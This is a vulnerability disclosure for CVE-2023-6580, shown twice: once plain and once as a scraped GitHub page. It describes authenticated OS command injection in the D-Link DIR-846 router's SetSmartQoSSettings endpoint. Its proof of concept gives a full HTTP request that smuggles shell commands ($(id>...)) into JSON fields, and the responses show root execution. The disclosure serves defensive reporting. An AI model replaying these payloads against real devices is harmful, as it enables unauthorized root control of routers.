=== Content from github.com_ec609952_20250115_114102.html ===

# D-Link DIR-846 Firmware FW100A53DBR was discovered to contain a remote command execution (RCE) vulnerability via keys smartqos\_express\_devices and smartqos\_normal\_devices in SetSmartQoSSettings.
## 1. Vulnerability Information
\*\*Authors\*\*: Françoa Taffarel Rosário Corrêa, Osmany Barros de Freitas and Lourenço Alves Pereira Junior.
\*\*Affiliation\*\*: Aeronautics Institute of Technology (ita.br)
\*\*Common Weakness Enumeration\*\*: CWE-78 - Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
\*\*Vulnerability Description\*\*: D-Link DIR-846 Firmware FW100A53DBR was discovered to contain a remote command execution (RCE) vulnerability via keys smartqos\_express\_devices and smartqos\_normal\_devices in SetSmartQoSSettings. This vulnerability is exploited via a crafted POST request. Another key is covered by CVE-2023-43284.
\*\*The detail of vulnerability\*\*: The exploitation method involves command injection through Authenticated user input with special characters. In this instance, the SetSmartQoSSettings.php file contains an exec function that uses partially sanitized user input. Specifically, the hazardous input originates from the smartqos\_normal\_devices and smartqos\_express\_devices keys in the JSON object of the POST request. The code manipulates these values and, without proper validation, allows the insertion of arbitrary commands.
In practice, an attacker can execute arbitrary commands by sending a malicious payload through a POST request. The content of the HTTP message is JSON-encoded, with the keys smartqos\_normal\_devices and smartqos\_express\_devices, which are strings with comma-separated values. Thus, the attacker must insert the malicious payload into one of these values. This leads the web server in the D-Link DIR-846 to invoke exec with a configuration script (presumably something like /etc/init.d/qos restart) on the host system, along with the manipulated values, resulting in the execution of arbitrary commands.
This vulnerability is particularly severe because it exploits the trust in authenticated users' input and the lack of adequate sanitization of data that are subsequently used in an operating system context, potentially giving an attacker control over the network device.
\*\*Vendor of the product\*\*: D-LINK
\*\*Affected product\*\*: DIR-846
\*\*Affected Version\*\*: Firmware DIR846enFW100A53DBR
\*\*Vulnerability Score V3.1\*\*:
\*\*Dates info\*\*:
Vulnerability discover: 22/11/2023
First try contact with vendor: 22/11/2023 via e-mail
Request CVE ID (VULDB): 23/11/2023
Date Record Created (MITRE):
First vendor response:
CVE Assignment Team response:
Second try contact with vendor:
CVE published in the CVE List:
## 2. Proof of Concept
\*\*Exploit Title\*\*: D-Link DIR-846 Firmware FW100A53DBR was discovered to contain a remote command execution (RCE) vulnerability via keys smartqos\_express\_devices and smartqos\_normal\_devices in SetSmartQoSSettings. (Authenticated)
\*\*Google Dork\*\*: NA
\*\*Date\*\*: 22/11/2023
\*\*Exploit Author\*\*: Françoa Taffarel
\*\*Vendor Homepage\*\*: https://www.dlink.com.br/produto/roteador-dir-846-gigabit-wi-fi-ac1200/#suporte
\*\*Software Link:\*\* https://www.dlink.com.br/wp-content/uploads/2020/02/DIR846enFW100A53DBR-Retail.zip
\*\*Version:\*\* DIR846enFW100A53DBR-Retail
\*\*Tested on:\*\* D-LINK DIR-846
\*\*CVE:\*\*
D-Link DIR-846 Firmware FW100A53DBR was discovered to contain a remote command execution (RCE) vulnerability via keys smartqos\_express\_devices and smartqos\_normal\_devices in SetSmartQoSSettings.
### Malicious POST Request
```
POST /HNAP1/ HTTP/1.1
Host: 192.168.1.50
Content-Length: 338
Accept: application/json
HNAP\_AUTH: 57C22CB05D65AC03708A1931EC990404 1700700605259
\*\*SOAPACTION: "http://purenetworks.com/HNAP1/SetSmartQoSSettings"\*\*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Content-Type: application/json
Origin: http://192.168.1.50
Referer: http://192.168.1.50/QoSControl.html?t=1700700591140
Accept-Encoding: gzip, deflate, br
Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7,ay;q=0.6
Cookie: PHPSESSID=44f0396bc541d3e4d5f173de1078b6c6; uid=qBFr6ykV; PrivateKey=5C89D2BA6B3C63075D0339A492A3FE4D; timeout=2
Connection: close
{
"SetSmartQoSSettings": {
"smartqos\_enable": "1",
"smartqos\_upstream\_shapingrate": "50001.92",
"smartqos\_downstream\_shapingrate": "50001.92",
"smartqos\_type": "by\_device",
"smartqos\_priority\_devices": "$(id>param\_alreadyreported)",
\*\* "smartqos\_express\_devices": "$(id>param\_not\_yet\_reported1)",
"smartqos\_normal\_devices": "$(id>param\_not\_yet\_reported2)"\*\*
}
}
```
### Response
```
HTTP/1.1 200 OK
X-Powered-By: PHP/7.1.9
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-type: text/html; charset=UTF-8
Connection: close
Date: Thu, 01 Dec 2022 11:03:54 GMT
Server: lighttpd/1.4.35
Content-Length: 68
\*\*{"SetIpMacBindSettingsResponse":{"SetIpMacBindSettingsResult":"OK"}}\*\*
```
### Data from RCE Request
```
\*\*GET /HNAP1/param\_not\_yet\_reported1 HTTP/1.1\*\*
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86\_64; rv:107.0) Gecko/20100101 Firefox/107.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,\*/\*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=133b3942febf51641c4bf0d81548ac78; uid=ljZlHjKV; PrivateKey=846232FD25AA8BEC8550EF6466B168D9; timeout=1
Upgrade-Insecure-Requests: 1
```
### Response
```
HTTP/1.1 200 OK
Content-Type: application/octet-stream
Accept-Ranges: bytes
Content-Length: 24
Connection: close
Date: Thu, 01 Dec 2022 23:24:28 GMT
Server: lighttpd/1.4.35
\*\*uid=0(root) gid=0(root)\*\*
```
### Data from RCE Request
```
\*\*GET /HNAP1/param\_not\_yet\_reported2 HTTP/1.1\*\*
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86\_64; rv:107.0) Gecko/20100101 Firefox/107.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,\*/\*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=133b3942febf51641c4bf0d81548ac78; uid=ljZlHjKV; PrivateKey=846232FD25AA8BEC8550EF6466B168D9; timeout=1
Upgrade-Insecure-Requests: 1
```
### Response
```
HTTP/1.1 200 OK
Content-Type: application/octet-stream
Accept-Ranges: bytes
Content-Length: 24
Connection: close
Date: Thu, 01 Dec 2022 23:24:28 GMT
Server: lighttpd/1.4.35
\*\*uid=0(root) gid=0(root)\*\*
```


=== Content from github.com_96e33cc4_20250114_191357.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fc2dc%2Fcve-reported%2Fblob%2Fmain%2FCVE-2023-6580%2FCVE-2023-6580.md)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fc2dc%2Fcve-reported%2Fblob%2Fmain%2FCVE-2023-6580%2FCVE-2023-6580.md)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=c2dc%2Fcve-reported)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[c2dc](/c2dc)
/
**[cve-reported](/c2dc/cve-reported)**
Public

* [Notifications](/login?return_to=%2Fc2dc%2Fcve-reported) You must be signed in to change notification settings
* [Fork
  2](/login?return_to=%2Fc2dc%2Fcve-reported)
* [Star
   7](/login?return_to=%2Fc2dc%2Fcve-reported)

* [Code](/c2dc/cve-reported)
* [Issues
  0](/c2dc/cve-reported/issues)
* [Pull requests
  0](/c2dc/cve-reported/pulls)
* [Actions](/c2dc/cve-reported/actions)
* [Projects
  0](/c2dc/cve-reported/projects)
* [Security](/c2dc/cve-reported/security)
* [Insights](/c2dc/cve-reported/pulse)

Additional navigation options

* [Code](/c2dc/cve-reported)
* [Issues](/c2dc/cve-reported/issues)
* [Pull requests](/c2dc/cve-reported/pulls)
* [Actions](/c2dc/cve-reported/actions)
* [Projects](/c2dc/cve-reported/projects)
* [Security](/c2dc/cve-reported/security)
* [Insights](/c2dc/cve-reported/pulse)

## Files

 main
## Breadcrumbs

1. [cve-reported](/c2dc/cve-reported/tree/main)
2. /[CVE-2023-6580](/c2dc/cve-reported/tree/main/CVE-2023-6580)
/
# CVE-2023-6580.md

Copy path Blame  Blame
## Latest commit

## History

[History](/c2dc/cve-reported/commits/main/CVE-2023-6580/CVE-2023-6580.md)173 lines (121 loc) · 6.36 KB main
## Breadcrumbs

1. [cve-reported](/c2dc/cve-reported/tree/main)
2. /[CVE-2023-6580](/c2dc/cve-reported/tree/main/CVE-2023-6580)
/
# CVE-2023-6580.md

Top
## File metadata and controls

* Preview
* Code
* Blame

173 lines (121 loc) · 6.36 KB[Raw](https://github.com/c2dc/cve-reported/raw/refs/heads/main/CVE-2023-6580/CVE-2023-6580.md)
# D-Link DIR-846 Firmware FW100A53DBR was discovered to contain a remote command execution (RCE) vulnerability via keys smartqos\_express\_devices and smartqos\_normal\_devices in SetSmartQoSSettings.

## 1. Vulnerability Information

**Authors**: Françoa Taffarel Rosário Corrêa, Osmany Barros de Freitas and Lourenço Alves Pereira Junior.

**Affiliation**: Aeronautics Institute of Technology (ita.br)

**Common Weakness Enumeration**: CWE-78 - Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')

**Vulnerability Description**: D-Link DIR-846 Firmware FW100A53DBR was discovered to contain a remote command execution (RCE) vulnerability via keys smartqos\_express\_devices and smartqos\_normal\_devices in SetSmartQoSSettings. This vulnerability is exploited via a crafted POST request. Another key is covered by CVE-2023-43284.

**The detail of vulnerability**: The exploitation method involves command injection through Authenticated user input with special characters. In this instance, the SetSmartQoSSettings.php file contains an exec function that uses partially sanitized user input. Specifically, the hazardous input originates from the smartqos\_normal\_devices and smartqos\_express\_devices keys in the JSON object of the POST request. The code manipulates these values and, without proper validation, allows the insertion of arbitrary commands.

In practice, an attacker can execute arbitrary commands by sending a malicious payload through a POST request. The content of the HTTP message is JSON-encoded, with the keys smartqos\_normal\_devices and smartqos\_express\_devices, which are strings with comma-separated values. Thus, the attacker must insert the malicious payload into one of these values. This leads the web server in the D-Link DIR-846 to invoke exec with a configuration script (presumably something like /etc/init.d/qos restart) on the host system, along with the manipulated values, resulting in the execution of arbitrary commands.

This vulnerability is particularly severe because it exploits the trust in authenticated users' input and the lack of adequate sanitization of data that are subsequently used in an operating system context, potentially giving an attacker control over the network device.

**Vendor of the product**: D-LINK

**Affected product**: DIR-846

**Affected Version**: Firmware DIR846enFW100A53DBR

**Vulnerability Score V3.1**:

**Dates info**:

Vulnerability discover: 22/11/2023

First try contact with vendor: 22/11/2023 via e-mail

Request CVE ID (VULDB): 23/11/2023

Date Record Created (MITRE):

First vendor response:

CVE Assignment Team response:

Second try contact with vendor:

CVE published in the CVE List:

## 2. Proof of Concept

**Exploit Title**: D-Link DIR-846 Firmware FW100A53DBR was discovered to contain a remote command execution (RCE) vulnerability via keys smartqos\_express\_devices and smartqos\_normal\_devices in SetSmartQoSSettings. (Authenticated)

**Google Dork**: NA

**Date**: 22/11/2023

**Exploit Author**: Françoa Taffarel

**Vendor Homepage**: <https://www.dlink.com.br/produto/roteador-dir-846-gigabit-wi-fi-ac1200/#suporte>

**Software Link:** <https://www.dlink.com.br/wp-content/uploads/2020/02/DIR846enFW100A53DBR-Retail.zip>

**Version:** DIR846enFW100A53DBR-Retail

**Tested on:** D-LINK DIR-846

**CVE:**

D-Link DIR-846 Firmware FW100A53DBR was discovered to contain a remote command execution (RCE) vulnerability via keys smartqos\_express\_devices and smartqos\_normal\_devices in SetSmartQoSSettings.

### Malicious POST Request

```
POST /HNAP1/ HTTP/1.1
Host: 192.168.1.50
Content-Length: 338
Accept: application/json
HNAP_AUTH: 57C22CB05D65AC03708A1931EC990404 1700700605259
**SOAPACTION: "http://purenetworks.com/HNAP1/SetSmartQoSSettings"**
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Content-Type: application/json
Origin: http://192.168.1.50
Referer: http://192.168.1.50/QoSControl.html?t=1700700591140
Accept-Encoding: gzip, deflate, br
Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7,ay;q=0.6
Cookie: PHPSESSID=44f0396bc541d3e4d5f173de1078b6c6; uid=qBFr6ykV; PrivateKey=5C89D2BA6B3C63075D0339A492A3FE4D; timeout=2
Connection: close

{
  "SetSmartQoSSettings": {
    "smartqos_enable": "1",
    "smartqos_upstream_shapingrate": "50001.92",
    "smartqos_downstream_shapingrate": "50001.92",
    "smartqos_type": "by_device",
    "smartqos_priority_devices": "$(id>param_alreadyreported)",
**    "smartqos_express_devices": "$(id>param_not_yet_reported1)",
    "smartqos_normal_devices": "$(id>param_not_yet_reported2)"**
  }
}

```

### Response

```
HTTP/1.1 200 OK
X-Powered-By: PHP/7.1.9
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-type: text/html; charset=UTF-8
Connection: close
Date: Thu, 01 Dec 2022 11:03:54 GMT
Server: lighttpd/1.4.35
Content-Length: 68

**{"SetIpMacBindSettingsResponse":{"SetIpMacBindSettingsResult":"OK"}}**

```

### Data from RCE Request

```
**GET /HNAP1/param_not_yet_reported1 HTTP/1.1**
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=133b3942febf51641c4bf0d81548ac78; uid=ljZlHjKV; PrivateKey=846232FD25AA8BEC8550EF6466B168D9; timeout=1
Upgrade-Insecure-Requests: 1

```

### Response

```
HTTP/1.1 200 OK
Content-Type: application/octet-stream
Accept-Ranges: bytes
Content-Length: 24
Connection: close
Date: Thu, 01 Dec 2022 23:24:28 GMT
Server: lighttpd/1.4.35

**uid=0(root) gid=0(root)**

```

### Data from RCE Request

```
**GET /HNAP1/param_not_yet_reported2 HTTP/1.1**
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=133b3942febf51641c4bf0d81548ac78; uid=ljZlHjKV; PrivateKey=846232FD25AA8BEC8550EF6466B168D9; timeout=1
Upgrade-Insecure-Requests: 1

```

### Response

```
HTTP/1.1 200 OK
Content-Type: application/octet-stream
Accept-Ranges: bytes
Content-Length: 24
Connection: close
Date: Thu, 01 Dec 2022 23:24:28 GMT
Server: lighttpd/1.4.35

**uid=0(root) gid=0(root)**

```

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


